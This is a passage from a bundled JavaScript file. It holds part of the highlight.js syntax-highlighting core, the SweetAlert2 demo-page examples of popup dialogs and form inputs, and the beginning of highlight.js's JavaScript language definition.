    result.code = context.code;
    fire("after:highlight", result);
    return result;
  }
  function _highlight(languageName, codeToHighlight, ignoreIllegals, continuation) {
    const keywordHits = /* @__PURE__ */ Object.create(null);
    function keywordData(mode, matchText) {
      return mode.keywords[matchText];
    }
    function processKeywords() {
      if (!top.keywords) {
        emitter.addText(modeBuffer);
        return;
      }
      let lastIndex = 0;
      top.keywordPatternRe.lastIndex = 0;
      let match = top.keywordPatternRe.exec(modeBuffer);
      let buf = "";
      while (match) {
        buf += modeBuffer.substring(lastIndex, match.index);
        const word = language.case_insensitive ? match[0].toLowerCase() : match[0];
        const data = keywordData(top, word);
        if (data) {
          const [kind, keywordRelevance] = data;
          emitter.addText(buf);
          buf = "";
          keywordHits[word] = (keywordHits[word] || 0) + 1;
          if (keywordHits[word] <= MAX_KEYWORD_HITS)
            relevance += keywordRelevance;
          if (kind.startsWith("_")) {
            buf += match[0];
          } else {
            const cssClass = language.classNameAliases[kind] || kind;
            emitter.addKeyword(match[0], cssClass);
          }
        } else {
          buf += match[0];
        }
        lastIndex = top.keywordPatternRe.lastIndex;
        match = top.keywordPatternRe.exec(modeBuffer);
      }
      buf += modeBuffer.substring(lastIndex);
      emitter.addText(buf);
    }
    function processSubLanguage() {
      if (modeBuffer === "")
        return;
      let result2 = null;
      if (typeof top.subLanguage === "string") {
        if (!languages[top.subLanguage]) {
          emitter.addText(modeBuffer);
          return;
        }
        result2 = _highlight(top.subLanguage, modeBuffer, true, continuations[top.subLanguage]);
        continuations[top.subLanguage] = result2._top;
      } else {
        result2 = highlightAuto(modeBuffer, top.subLanguage.length ? top.subLanguage : null);
      }
      if (top.relevance > 0) {
        relevance += result2.relevance;
      }
      emitter.addSublanguage(result2._emitter, result2.language);
    }
    function processBuffer() {
      if (top.subLanguage != null) {
        processSubLanguage();
      } else {
        processKeywords();
      }
      modeBuffer = "";
    }
    function emitMultiClass(scope, match) {
      let i = 1;
      const max = match.length - 1;
      while (i <= max) {
        if (!scope._emit[i]) {
          i++;
          continue;
        }
        const klass = language.classNameAliases[scope[i]] || scope[i];
        const text = match[i];
        if (klass) {
          emitter.addKeyword(text, klass);
        } else {
          modeBuffer = text;
          processKeywords();
          modeBuffer = "";
        }
        i++;
      }
    }
    function startNewMode(mode, match) {
      if (mode.scope && typeof mode.scope === "string") {
        emitter.openNode(language.classNameAliases[mode.scope] || mode.scope);
      }
      if (mode.beginScope) {
        if (mode.beginScope._wrap) {
          emitter.addKeyword(modeBuffer, language.classNameAliases[mode.beginScope._wrap] || mode.beginScope._wrap);
          modeBuffer = "";
        } else if (mode.beginScope._multi) {
          emitMultiClass(mode.beginScope, match);
          modeBuffer = "";
        }
      }
      top = Object.create(mode, { parent: { value: top } });
      return top;
    }
    function endOfMode(mode, match, matchPlusRemainder) {
      let matched = startsWith(mode.endRe, matchPlusRemainder);
      if (matched) {
        if (mode["on:end"]) {
          const resp = new Response(mode);
          mode["on:end"](match, resp);
          if (resp.isMatchIgnored)
            matched = false;
        }
        if (matched) {
          while (mode.endsParent && mode.parent) {
            mode = mode.parent;
          }
          return mode;
        }
      }
      if (mode.endsWithParent) {
        return endOfMode(mode.parent, match, matchPlusRemainder);
      }
    }
    function doIgnore(lexeme) {
      if (top.matcher.regexIndex === 0) {
        modeBuffer += lexeme[0];
        return 1;
      } else {
        resumeScanAtSamePosition = true;
        return 0;
      }
    }
    function doBeginMatch(match) {
      const lexeme = match[0];
      const newMode = match.rule;
      const resp = new Response(newMode);
      const beforeCallbacks = [newMode.__beforeBegin, newMode["on:begin"]];
      for (const cb of beforeCallbacks) {
        if (!cb)
          continue;
        cb(match, resp);
        if (resp.isMatchIgnored)
          return doIgnore(lexeme);
      }
      if (newMode.skip) {
        modeBuffer += lexeme;
      } else {
        if (newMode.excludeBegin) {
          modeBuffer += lexeme;
        }
        processBuffer();
        if (!newMode.returnBegin && !newMode.excludeBegin) {
          modeBuffer = lexeme;
        }
      }
      startNewMode(newMode, match);
      return newMode.returnBegin ? 0 : lexeme.length;
    }
    function doEndMatch(match) {
      const lexeme = match[0];
      const matchPlusRemainder = codeToHighlight.substring(match.index);
      const endMode = endOfMode(top, match, matchPlusRemainder);
      if (!endMode) {
        return NO_MATCH;
      }
      const origin = top;
      if (top.endScope && top.endScope._wrap) {
        processBuffer();
        emitter.addKeyword(lexeme, top.endScope._wrap);
      } else if (top.endScope && top.endScope._multi) {
        processBuffer();
        emitMultiClass(top.endScope, match);
      } else if (origin.skip) {
        modeBuffer += lexeme;
      } else {
        if (!(origin.returnEnd || origin.excludeEnd)) {
          modeBuffer += lexeme;
        }
        processBuffer();
        if (origin.excludeEnd) {
          modeBuffer = lexeme;
        }
      }
      do {
        if (top.scope) {
          emitter.closeNode();
        }
        if (!top.skip && !top.subLanguage) {
          relevance += top.relevance;
        }
        top = top.parent;
      } while (top !== endMode.parent);
      if (endMode.starts) {
        startNewMode(endMode.starts, match);
      }
      return origin.returnEnd ? 0 : lexeme.length;
    }
    function processContinuations() {
      const list = [];
      for (let current = top; current !== language; current = current.parent) {
        if (current.scope) {
          list.unshift(current.scope);
        }
      }
      list.forEach((item) => emitter.openNode(item));
    }
    let lastMatch = {};
    function processLexeme(textBeforeMatch, match) {
      const lexeme = match && match[0];
      modeBuffer += textBeforeMatch;
      if (lexeme == null) {
        processBuffer();
        return 0;
      }
      if (lastMatch.type === "begin" && match.type === "end" && lastMatch.index === match.index && lexeme === "") {
        modeBuffer += codeToHighlight.slice(match.index, match.index + 1);
        if (!SAFE_MODE) {
          const err = new Error(`0 width match regex (${languageName})`);
          err.languageName = languageName;
          err.badRule = lastMatch.rule;
          throw err;
        }
        return 1;
      }
      lastMatch = match;
      if (match.type === "begin") {
        return doBeginMatch(match);
      } else if (match.type === "illegal" && !ignoreIllegals) {
        const err = new Error('Illegal lexeme "' + lexeme + '" for mode "' + (top.scope || "<unnamed>") + '"');
        err.mode = top;
        throw err;
      } else if (match.type === "end") {
        const processed = doEndMatch(match);
        if (processed !== NO_MATCH) {
          return processed;
        }
      }
      if (match.type === "illegal" && lexeme === "") {
        return 1;
      }
      if (iterations > 1e5 && iterations > match.index * 3) {
        const err = new Error("potential infinite loop, way more iterations than matches");
        throw err;
      }
      modeBuffer += lexeme;
      return lexeme.length;
    }
    const language = getLanguage(languageName);
    if (!language) {
      error(LANGUAGE_NOT_FOUND.replace("{}", languageName));
      throw new Error('Unknown language: "' + languageName + '"');
    }
    const md = compileLanguage(language);
    let result = "";
    let top = continuation || md;
    const continuations = {};
    const emitter = new options.__emitter(options);
    processContinuations();
    let modeBuffer = "";
    let relevance = 0;
    let index = 0;
    let iterations = 0;
    let resumeScanAtSamePosition = false;
    try {
      top.matcher.considerAll();
      for (; ; ) {
        iterations++;
        if (resumeScanAtSamePosition) {
          resumeScanAtSamePosition = false;
        } else {
          top.matcher.considerAll();
        }
        top.matcher.lastIndex = index;
        const match = top.matcher.exec(codeToHighlight);
        if (!match)
          break;
        const beforeMatch = codeToHighlight.substring(index, match.index);
        const processedCount = processLexeme(beforeMatch, match);
        index = match.index + processedCount;
      }
      processLexeme(codeToHighlight.substring(index));
      emitter.closeAllNodes();
      emitter.finalize();
      result = emitter.toHTML();
      return {
        language: languageName,
        value: result,
        relevance,
        illegal: false,
        _emitter: emitter,
        _top: top
      };
    } catch (err) {
      if (err.message && err.message.includes("Illegal")) {
        return {
          language: languageName,
          value: escape(codeToHighlight),
          illegal: true,
          relevance: 0,
          _illegalBy: {
            message: err.message,
            index,
            context: codeToHighlight.slice(index - 100, index + 100),
            mode: err.mode,
            resultSoFar: result
          },
          _emitter: emitter
        };
      } else if (SAFE_MODE) {
        return {
          language: languageName,
          value: escape(codeToHighlight),
          illegal: false,
          relevance: 0,
          errorRaised: err,
          _emitter: emitter,
          _top: top
        };
      } else {
        throw err;
      }
    }
  }
  function justTextHighlightResult(code) {
    const result = {
      value: escape(code),
      illegal: false,
      relevance: 0,
      _top: PLAINTEXT_LANGUAGE,
      _emitter: new options.__emitter(options)
    };
    result._emitter.addText(code);
    return result;
  }
  function highlightAuto(code, languageSubset) {
    languageSubset = languageSubset || options.languages || Object.keys(languages);
    const plaintext = justTextHighlightResult(code);
    const results = languageSubset.filter(getLanguage).filter(autoDetection).map(
      (name) => _highlight(name, code, false)
    );
    results.unshift(plaintext);
    const sorted = results.sort((a, b) => {
      if (a.relevance !== b.relevance)
        return b.relevance - a.relevance;
      if (a.language && b.language) {
        if (getLanguage(a.language).supersetOf === b.language) {
          return 1;
        } else if (getLanguage(b.language).supersetOf === a.language) {
          return -1;
        }
      }
      return 0;
    });
    const [best, secondBest] = sorted;
    const result = best;
    result.secondBest = secondBest;
    return result;
  }
  function updateClassName(element, currentLang, resultLang) {
    const language = currentLang && aliases[currentLang] || resultLang;
    element.classList.add("hljs");
    element.classList.add(`language-${language}`);
  }
  function highlightElement(element) {
    let node = null;
    const language = blockLanguage(element);
    if (shouldNotHighlight(language))
      return;
    fire(
      "before:highlightElement",
      { el: element, language }
    );
    if (element.children.length > 0) {
      if (!options.ignoreUnescapedHTML) {
        console.warn("One of your code blocks includes unescaped HTML. This is a potentially serious security risk.");
        console.warn("https://github.com/highlightjs/highlight.js/wiki/security");
        console.warn("The element with unescaped HTML:");
        console.warn(element);
      }
      if (options.throwUnescapedHTML) {
        const err = new HTMLInjectionError(
          "One of your code blocks includes unescaped HTML.",
          element.innerHTML
        );
        throw err;
      }
    }
    node = element;
    const text = node.textContent;
    const result = language ? highlight2(text, { language, ignoreIllegals: true }) : highlightAuto(text);
    element.innerHTML = result.value;
    updateClassName(element, language, result.language);
    element.result = {
      language: result.language,
      re: result.relevance,
      relevance: result.relevance
    };
    if (result.secondBest) {
      element.secondBest = {
        language: result.secondBest.language,
        relevance: result.secondBest.relevance
      };
    }
    fire("after:highlightElement", { el: element, result, text });
  }
  function configure(userOptions) {
    options = inherit(options, userOptions);
  }
  const initHighlighting = () => {
    highlightAll();
    deprecated("10.6.0", "initHighlighting() deprecated.  Use highlightAll() now.");
  };
  function initHighlightingOnLoad() {
    highlightAll();
    deprecated("10.6.0", "initHighlightingOnLoad() deprecated.  Use highlightAll() now.");
  }
  let wantsHighlight = false;
  function highlightAll() {
    if (document.readyState === "loading") {
      wantsHighlight = true;
      return;
    }
    const blocks = document.querySelectorAll(options.cssSelector);
    blocks.forEach(highlightElement);
  }
  function boot() {
    if (wantsHighlight)
      highlightAll();
  }
  if (typeof window !== "undefined" && window.addEventListener) {
    window.addEventListener("DOMContentLoaded", boot, false);
  }
  function registerLanguage(languageName, languageDefinition) {
    let lang = null;
    try {
      lang = languageDefinition(hljs);
    } catch (error$1) {
      error("Language definition for '{}' could not be registered.".replace("{}", languageName));
      if (!SAFE_MODE) {
        throw error$1;
      } else {
        error(error$1);
      }
      lang = PLAINTEXT_LANGUAGE;
    }
    if (!lang.name)
      lang.name = languageName;
    languages[languageName] = lang;
    lang.rawDefinition = languageDefinition.bind(null, hljs);
    if (lang.aliases) {
      registerAliases(lang.aliases, { languageName });
    }
  }
  function unregisterLanguage(languageName) {
    delete languages[languageName];
    for (const alias of Object.keys(aliases)) {
      if (aliases[alias] === languageName) {
        delete aliases[alias];
      }
    }
  }
  function listLanguages() {
    return Object.keys(languages);
  }
  function getLanguage(name) {
    name = (name || "").toLowerCase();
    return languages[name] || languages[aliases[name]];
  }
  function registerAliases(aliasList, { languageName }) {
    if (typeof aliasList === "string") {
      aliasList = [aliasList];
    }
    aliasList.forEach((alias) => {
      aliases[alias.toLowerCase()] = languageName;
    });
  }
  function autoDetection(name) {
    const lang = getLanguage(name);
    return lang && !lang.disableAutodetect;
  }
  function upgradePluginAPI(plugin) {
    if (plugin["before:highlightBlock"] && !plugin["before:highlightElement"]) {
      plugin["before:highlightElement"] = (data) => {
        plugin["before:highlightBlock"](
          Object.assign({ block: data.el }, data)
        );
      };
    }
    if (plugin["after:highlightBlock"] && !plugin["after:highlightElement"]) {
      plugin["after:highlightElement"] = (data) => {
        plugin["after:highlightBlock"](
          Object.assign({ block: data.el }, data)
        );
      };
    }
  }
  function addPlugin(plugin) {
    upgradePluginAPI(plugin);
    plugins.push(plugin);
  }
  function fire(event, args) {
    const cb = event;
    plugins.forEach(function(plugin) {
      if (plugin[cb]) {
        plugin[cb](args);
      }
    });
  }
  function deprecateHighlightBlock(el) {
    deprecated("10.7.0", "highlightBlock will be removed entirely in v12.0");
    deprecated("10.7.0", "Please use highlightElement now.");
    return highlightElement(el);
  }
  Object.assign(hljs, {
    highlight: highlight2,
    highlightAuto,
    highlightAll,
    highlightElement,
    highlightBlock: deprecateHighlightBlock,
    configure,
    initHighlighting,
    initHighlightingOnLoad,
    registerLanguage,
    unregisterLanguage,
    listLanguages,
    getLanguage,
    registerAliases,
    autoDetection,
    inherit,
    addPlugin
  });
  hljs.debugMode = function() {
    SAFE_MODE = false;
  };
  hljs.safeMode = function() {
    SAFE_MODE = true;
  };
  hljs.versionString = version;
  hljs.regex = {
    concat,
    lookahead,
    either,
    optional,
    anyNumberOfTimes
  };
  for (const key in MODES) {
    if (typeof MODES[key] === "object") {
      deepFreezeEs6.exports(MODES[key]);
    }
  }
  Object.assign(hljs, MODES);
  return hljs;
};
var highlight = HLJS({});
var core = highlight;
highlight.HighlightJS = highlight;
highlight.default = highlight;
const HighlightJS = core;
const examples = {
  normalAlert() {
    alert("You clicked the button!");
  },
  sweetAlert() {
    Swal$1.fire(
      "Good job!",
      "You clicked the button!",
      "success"
    );
  },
  basicMessage() {
    Swal$1.fire("Any fool can use a computer");
  },
  titleText() {
    Swal$1.fire(
      "The Internet?",
      "That thing is still around?",
      "question"
    );
  },
  errorType() {
    Swal$1.fire({
      icon: "error",
      title: "Oops...",
      text: "Something went wrong!",
      footer: "<a href>Why do I have this issue?</a>"
    });
  },
  longText() {
    Swal$1.fire({
      imageUrl: "https://placeholder.pics/svg/300x1500",
      imageHeight: 1500,
      imageAlt: "A tall image"
    });
  },
  customHtml() {
    Swal$1.fire({
      title: "<strong>HTML <u>example</u></strong>",
      icon: "info",
      html: `
        You can use <b>bold text</b>,
        <a href="//sweetalert2.github.io">links</a>
        and other HTML tags
      `,
      showCloseButton: true,
      showCancelButton: true,
      focusConfirm: false,
      confirmButtonText: `
        <i class="fa fa-thumbs-up"></i> Great!`,
      confirmButtonAriaLabel: "Thumbs up, great!",
      cancelButtonText: `
        <i class="fa fa-thumbs-down"></i>`,
      cancelButtonAriaLabel: "Thumbs down"
    });
  },
  threeButtons() {
    Swal$1.fire({
      title: "Do you want to save the changes?",
      showDenyButton: true,
      showCancelButton: true,
      confirmButtonText: "Save",
      denyButtonText: `Don't save`
    }).then((result) => {
      if (result.isConfirmed) {
        Swal$1.fire("Saved!", "", "success");
      } else if (result.isDenied) {
        Swal$1.fire("Changes are not saved", "", "info");
      }
    });
  },
  customPosition() {
    Swal$1.fire({
      position: "top-end",
      icon: "success",
      title: "Your work has been saved",
      showConfirmButton: false,
      timer: 1500
    });
  },
  customAnimation() {
    Swal$1.fire({
      title: "Custom animation with Animate.css",
      showClass: {
        popup: "animate__animated animate__fadeInDown"
      },
      hideClass: {
        popup: "animate__animated animate__fadeOutUp"
      }
    });
  },
  warningConfirm() {
    Swal$1.fire({
      title: "Are you sure?",
      text: "You won't be able to revert this!",
      icon: "warning",
      showCancelButton: true,
      confirmButtonColor: "#3085d6",
      cancelButtonColor: "#d33",
      confirmButtonText: "Yes, delete it!"
    }).then((result) => {
      if (result.isConfirmed) {
        Swal$1.fire(
          "Deleted!",
          "Your file has been deleted.",
          "success"
        );
      }
    });
  },
  handleDismiss() {
    const swalWithBootstrapButtons = Swal$1.mixin({
      customClass: {
        confirmButton: "btn btn-success",
        cancelButton: "btn btn-danger"
      },
      buttonsStyling: false
    });
    swalWithBootstrapButtons.fire({
      title: "Are you sure?",
      text: "You won't be able to revert this!",
      icon: "warning",
      showCancelButton: true,
      confirmButtonText: "Yes, delete it!",
      cancelButtonText: "No, cancel!",
      reverseButtons: true
    }).then((result) => {
      if (result.isConfirmed) {
        swalWithBootstrapButtons.fire(
          "Deleted!",
          "Your file has been deleted.",
          "success"
        );
      }
      if (result.dismiss === Swal$1.DismissReason.cancel) {
        swalWithBootstrapButtons.fire(
          "Cancelled",
          "Your imaginary file is safe :)",
          "error"
        );
      }
    });
  },
  customImage() {
    Swal$1.fire({
      title: "Sweet!",
      text: "Modal with a custom image.",
      imageUrl: "https://unsplash.it/400/200",
      imageWidth: 400,
      imageHeight: 200,
      imageAlt: "Custom image"
    });
  },
  customWidth() {
    Swal$1.fire({
      title: "Custom width, padding, color, background.",
      width: 600,
      padding: "3em",
      color: "#716add",
      background: "#fff url(/images/trees.png)",
      backdrop: `
        rgba(0,0,123,0.4)
        url("/images/nyan-cat.gif")
        left top
        no-repeat
      `
    });
  },
  timer() {
    let timerInterval;
    Swal$1.fire({
      title: "Auto close alert!",
      html: "I will close in <b></b> milliseconds.",
      timer: 2e3,
      timerProgressBar: true,
      didOpen: () => {
        Swal$1.showLoading();
        const b = Swal$1.getPopup().querySelector("b");
        timerInterval = setInterval(() => {
          b.textContent = Swal$1.getTimerLeft();
        }, 100);
      },
      willClose: () => {
        clearInterval(timerInterval);
      }
    }).then((result) => {
      if (result.dismiss === Swal$1.DismissReason.timer) {
        console.log("I was closed by the timer");
      }
    });
  },
  rtl() {
    Swal$1.fire({
      title: "\u0647\u0644 \u062A\u0631\u064A\u062F \u0627\u0644\u0627\u0633\u062A\u0645\u0631\u0627\u0631\u061F",
      icon: "question",
      iconHtml: "\u061F",
      target: document.getElementById("rtl-container"),
      confirmButtonText: "\u0646\u0639\u0645",
      cancelButtonText: "\u0644\u0627",
      showCancelButton: true,
      showCloseButton: true
    });
  },
  ajaxRequest() {
    Swal$1.fire({
      title: "Submit your Github username",
      input: "text",
      inputAttributes: {
        autocapitalize: "off"
      },
      showCancelButton: true,
      confirmButtonText: "Look up",
      showLoaderOnConfirm: true,
      preConfirm: (login) => {
        const usersUrl = `//api.github.com/users/${login}`;
        return fetch(usersUrl).then((response) => {
          if (!response.ok) {
            throw new Error(response.statusText);
          }
          return response.json();
        }).catch((error2) => {
          Swal$1.showValidationMessage(
            `Request failed: ${error2}`
          );
        });
      },
      allowOutsideClick: () => !Swal$1.isLoading()
    }).then((result) => {
      if (result.isConfirmed) {
        Swal$1.fire({
          title: `${result.value.login}'s avatar`,
          imageUrl: result.value.avatar_url
        });
      }
    });
  },
  mixin() {
    const Toast = Swal$1.mixin({
      toast: true,
      footer: "",
      position: "top-end",
      showConfirmButton: false,
      timer: 3e3,
      timerProgressBar: true,
      didOpen: (toast) => {
        toast.onmouseenter = Swal$1.stopTimer;
        toast.onmouseleave = Swal$1.resumeTimer;
      }
    });
    Toast.fire({
      icon: "success",
      title: "Signed in successfully"
    });
  },
  declarativeTemplate() {
    Swal$1.fire({
      template: "#my-template"
    });
  },
  declarativeTriggering() {
    Swal$1.bindClickHandler();
    Swal$1.mixin({
      toast: true
    }).bindClickHandler("data-swal-toast-template");
  },
  async textInput() {
    const ipAPI = "//api.ipify.org?format=json";
    const inputValue = fetch(ipAPI).then((response) => response.json()).then((data) => data.ip);
    const { value: ipAddress } = await Swal$1.fire({
      title: "Enter your IP address",
      input: "text",
      inputLabel: "Your IP address",
      inputValue,
      showCancelButton: true,
      inputValidator: (value) => {
        if (!value) {
          return "You need to write something!";
        }
      }
    });
    if (ipAddress) {
      Swal$1.fire(`Your IP address is ${ipAddress}`);
    }
  },
  async emailInput() {
    const { value: email } = await Swal$1.fire({
      title: "Input email address",
      input: "email",
      inputLabel: "Your email address",
      inputPlaceholder: "Enter your email address"
    });
    if (email) {
      Swal$1.fire(`Entered email: ${email}`);
    }
  },
  async urlInput() {
    const { value: url } = await Swal$1.fire({
      input: "url",
      inputLabel: "URL address",
      inputPlaceholder: "Enter the URL"
    });
    if (url) {
      Swal$1.fire(`Entered URL: ${url}`);
    }
  },
  async passwordInput() {
    const { value: password } = await Swal$1.fire({
      title: "Enter your password",
      input: "password",
      inputLabel: "Password",
      inputPlaceholder: "Enter your password",
      inputAttributes: {
        maxlength: 10,
        autocapitalize: "off",
        autocorrect: "off"
      }
    });
    if (password) {
      Swal$1.fire(`Entered password: ${password}`);
    }
  },
  async textareaInput() {
    const { value: text } = await Swal$1.fire({
      input: "textarea",
      inputLabel: "Message",
      inputPlaceholder: "Type your message here...",
      inputAttributes: {
        "aria-label": "Type your message here"
      },
      showCancelButton: true
    });
    if (text) {
      Swal$1.fire(text);
    }
  },
  async selectInput() {
    const { value: fruit } = await Swal$1.fire({
      title: "Select field validation",
      input: "select",
      inputOptions: {
        "Fruits": {
          apples: "Apples",
          bananas: "Bananas",
          grapes: "Grapes",
          oranges: "Oranges"
        },
        "Vegetables": {
          potato: "Potato",
          broccoli: "Broccoli",
          carrot: "Carrot"
        },
        "icecream": "Ice cream"
      },
      inputPlaceholder: "Select a fruit",
      showCancelButton: true,
      inputValidator: (value) => {
        return new Promise((resolve) => {
          if (value === "oranges") {
            resolve();
          } else {
            resolve("You need to select oranges :)");
          }
        });
      }
    });
    if (fruit) {
      Swal$1.fire(`You selected: ${fruit}`);
    }
  },
  async radioInput() {
    const inputOptions = new Promise((resolve) => {
      setTimeout(() => {
        resolve({
          "#ff0000": "Red",
          "#00ff00": "Green",
          "#0000ff": "Blue"
        });
      }, 1e3);
    });
    const { value: color } = await Swal$1.fire({
      title: "Select color",
      input: "radio",
      inputOptions,
      inputValidator: (value) => {
        if (!value) {
          return "You need to choose something!";
        }
      }
    });
    if (color) {
      Swal$1.fire({ html: `You selected: ${color}` });
    }
  },
  async checkboxInput() {
    const { value: accept } = await Swal$1.fire({
      title: "Terms and conditions",
      input: "checkbox",
      inputValue: 1,
      inputPlaceholder: "I agree with the terms and conditions",
      confirmButtonText: 'Continue&nbsp;<i class="fa fa-arrow-right"></i>',
      inputValidator: (result) => {
        return !result && "You need to agree with T&C";
      }
    });
    if (accept) {
      Swal$1.fire("You agreed with T&C :)");
    }
  },
  async fileInput() {
    const { value: file } = await Swal$1.fire({
      title: "Select image",
      input: "file",
      inputAttributes: {
        "accept": "image/*",
        "aria-label": "Upload your profile picture"
      }
    });
    if (file) {
      const reader = new FileReader();
      reader.onload = (e) => {
        Swal$1.fire({
          title: "Your uploaded picture",
          imageUrl: e.target.result,
          imageAlt: "The uploaded picture"
        });
      };
      reader.readAsDataURL(file);
    }
  },
  rangeInput() {
    Swal$1.fire({
      title: "How old are you?",
      icon: "question",
      input: "range",
      inputLabel: "Your age",
      inputAttributes: {
        min: 8,
        max: 120,
        step: 1
      },
      inputValue: 25
    });
  },
  async multipleInputs() {
    const { value: formValues } = await Swal$1.fire({
      title: "Multiple inputs",
      html: '<input id="swal-input1" class="swal2-input"><input id="swal-input2" class="swal2-input">',
      focusConfirm: false,
      preConfirm: () => {
        return [
          document.getElementById("swal-input1").value,
          document.getElementById("swal-input2").value
        ];
      }
    });
    if (formValues) {
      Swal$1.fire(JSON.stringify(formValues));
    }
  }
};
Object.entries(examples).forEach(([id, fn]) => {
  let fnString = String(fn);
  fnString = fnString.replace(/Swal\$\d\./g, "Swal.");
  fnString = fnString.replace(/\\u..../g, (utfCharEncoded) => {
    return JSON.parse(`"${utfCharEncoded}"`);
  });
  fnString = fnString.replace(/\s+target: document.getElementById\(['"]rtl-container['"]\),/g, "");
  fnString = fnString.replace(/\s+footer: ['"]['"],.*/g, "");
  fnString = fnString.replace(/;/g, "");
  examples[id] = { id, fn, fnString };
});
const showSidebar = () => {
  let nav;
  Swal.fire({
    html: document.querySelector("nav"),
    showConfirmButton: false,
    showCloseButton: true,
    position: "top-left",
    customClass: {
      container: "sidebar",
      popup: "border-radius-0"
    },
    showClass: {
      popup: "animate__animated animate__fadeInLeft animate__faster"
    },
    hideClass: {
      popup: "animate__animated animate__fadeOutLeft animate__faster"
    },
    willOpen: () => {
      Swal.getHtmlContainer().querySelectorAll("a").forEach((a) => {
        a.addEventListener("click", () => Swal.close());
      });
    },
    willClose: () => {
      nav = Swal.getHtmlContainer().querySelector("nav");
    },
    didClose: () => {
      document.body.insertBefore(nav, document.querySelector("#show-sidebar"));
    },
    width: 320,
    footer: `This sidebar is powered by SweetAlert2 as well :)
      <a href="https://github.com/sweetalert2/sweetalert2.github.io/blob/main/src/sidebar.js" class="nowrap" target="_blank">Code \u2197</a>`
  });
};
const IDENT_RE = "[A-Za-z$_][0-9A-Za-z$_]*";
const KEYWORDS = [
  "as",
  "in",
  "of",
  "if",
  "for",
  "while",
  "finally",
  "var",
  "new",
  "function",
  "do",
  "return",
  "void",
  "else",
  "break",
  "catch",
  "instanceof",
  "with",
  "throw",
  "case",
  "default",
  "try",
  "switch",
  "continue",
  "typeof",
  "delete",
  "let",
  "yield",
  "const",
  "class",
  "debugger",
  "async",
  "await",
  "static",
  "import",
  "from",
  "export",
  "extends"
];
const LITERALS = [
  "true",
  "false",
  "null",
  "undefined",
  "NaN",
  "Infinity"
];
const TYPES = [
  "Object",
  "Function",
  "Boolean",
  "Symbol",
  "Math",
  "Date",
  "Number",
  "BigInt",
  "String",
  "RegExp",
  "Array",
  "Float32Array",
  "Float64Array",
  "Int8Array",
  "Uint8Array",
  "Uint8ClampedArray",
  "Int16Array",
  "Int32Array",
  "Uint16Array",
  "Uint32Array",
  "BigInt64Array",
  "BigUint64Array",
  "Set",
  "Map",
  "WeakSet",
  "WeakMap",
  "ArrayBuffer",
  "SharedArrayBuffer",
  "Atomics",
  "DataView",
  "JSON",
  "Promise",
  "Generator",
  "GeneratorFunction",
  "AsyncFunction",
  "Reflect",
  "Proxy",
  "Intl",
  "WebAssembly"
];
const ERROR_TYPES = [
  "Error",
  "EvalError",
  "InternalError",
  "RangeError",
  "ReferenceError",
  "SyntaxError",
  "TypeError",
  "URIError"
];
const BUILT_IN_GLOBALS = [
  "setInterval",
  "setTimeout",
  "clearInterval",
  "clearTimeout",
  "require",
  "exports",
  "eval",
  "isFinite",
  "isNaN",
  "parseFloat",
  "parseInt",
  "decodeURI",
  "decodeURIComponent",
  "encodeURI",
  "encodeURIComponent",
  "escape",
  "unescape"
];
const BUILT_IN_VARIABLES = [
  "arguments",
  "this",
  "super",
  "console",
  "window",
  "document",
  "localStorage",
  "module",
  "global"
];
const BUILT_INS = [].concat(
  BUILT_IN_GLOBALS,
  TYPES,
  ERROR_TYPES
);
function javascript(hljs) {
  const regex = hljs.regex;
  const hasClosingTag = (match, { after }) => {
    const tag = "</" + match[0].slice(1);
    const pos = match.input.indexOf(tag, after);
    return pos !== -1;
  };
  const IDENT_RE$12 = IDENT_RE;
  const FRAGMENT = {
    begin: "<>",
    end: "</>"
  };
  const XML_SELF_CLOSING = /<[A-Za-z0-9\\._:-]+\s*\/>/;
  const XML_TAG = {
    begin: /<[A-Za-z0-9\\._:-]+/,
    end: /\/[A-Za-z0-9\\._:-]+>|\/>/,
    isTrulyOpeningTag: (match, response) => {
      const afterMatchIndex = match[0].length + match.index;
      const nextChar = match.input[afterMatchIndex];
      if (nextChar === "<" || nextChar === ",") {
        response.ignoreMatch();
        return;
      }
      if (nextChar === ">") {
        if (!hasClosingTag(match, { after: afterMatchIndex })) {
          response.ignoreMatch();
        }
      }
      let m;
      const afterMatch = match.input.substring(afterMatchIndex);
      if (m = afterMatch.match(/^\s+extends\s+/)) {
        if (m.index === 0) {
          response.ignoreMatch();
          return;
        }
      }
    }
  };
  const KEYWORDS$1 = {
    $pattern: IDENT_RE,
    keyword: KEYWORDS,
    literal: LITERALS,
    built_in: BUILT_INS,
    "variable.language": BUILT_IN_VARIABLES
  };
  const decimalDigits = "[0-9](_?[0-9])*";
  const frac = `\\.(${decimalDigits})`;
  const decimalInteger = `0|[1-9](_?[0-9])*|0[0-7]*[89][0-9]*`;
  const NUMBER = {
    className: "number",
    variants: [
      { begin: `(\\b(${decimalInteger})((${frac})|\\.)?|(${frac}))[eE][+-]?(${decimalDigits})\\b` },
      { begin: `\\b(${decimalInteger})\\b((${frac})\\b|\\.)?|(${frac})\\b` },
      { begin: `\\b(0|[1-9](_?[0-9])*)n\\b` },
      { begin: "\\b0[xX][0-9a-fA-F](_?[0-9a-fA-F])*n?\\b" },
      { begin: "\\b0[bB][0-1](_?[0-1])*n?\\b" },
      { begin: "\\b0[oO][0-7](_?[0-7])*n?\\b" },
      { begin: "\\b0[0-7]+n?\\b" }
    ],
    relevance: 0
  };
  const SUBST = {
    className: "subst",
    begin: "\\$\\{",
    end: "\\}",
    keywords: KEYWORDS$1,
    contains: []
  };
  const HTML_TEMPLATE = {
    begin: "html`",
    end: "",
    starts: {
      end: "`",
      returnEnd: false,
      contains: [
        hljs.BACKSLASH_ESCAPE,
        SUBST
      ],
      subLanguage: "xml"
    }
  };
  const CSS_TEMPLATE = {
    begin: "css`",
    end: "",
    starts: {
      end: "`",
      returnEnd: false,
      contains: [
        hljs.BACKSLASH_ESCAPE,
        SUBST
      ],
      subLanguage: "css"
    }
  };
  const TEMPLATE_STRING = {
    className: "string",
    begin: "`",
    end: "`",
    contains: [
      hljs.BACKSLASH_ESCAPE,
      SUBST
    ]
  };
  const JSDOC_COMMENT = hljs.COMMENT(
    /\/\*\*(?!\/)/,
    "\\*/",
    {
      relevance: 0,
      contains: [
        {
          begin: "(?=@[A-Za-z]+)",
          relevance: 0,
          contains: [
            {
              className: "doctag",
              begin: "@[A-Za-z]+"
            },
            {
              className: "type",
              begin: "\\{",
              end: "\\}",
              excludeEnd: true,
              excludeBegin: true,
              relevance: 0
            },
            {
              className: "variable",
              begin: IDENT_RE$12 + "(?=\\s*(-)|$)",
              endsParent: true,
              relevance: 0
            },
            {
              begin: /(?=[^\n])\s/,
              relevance: 0
            }
          ]
        }
      ]
    }
  );
  const COMMENT2 = {
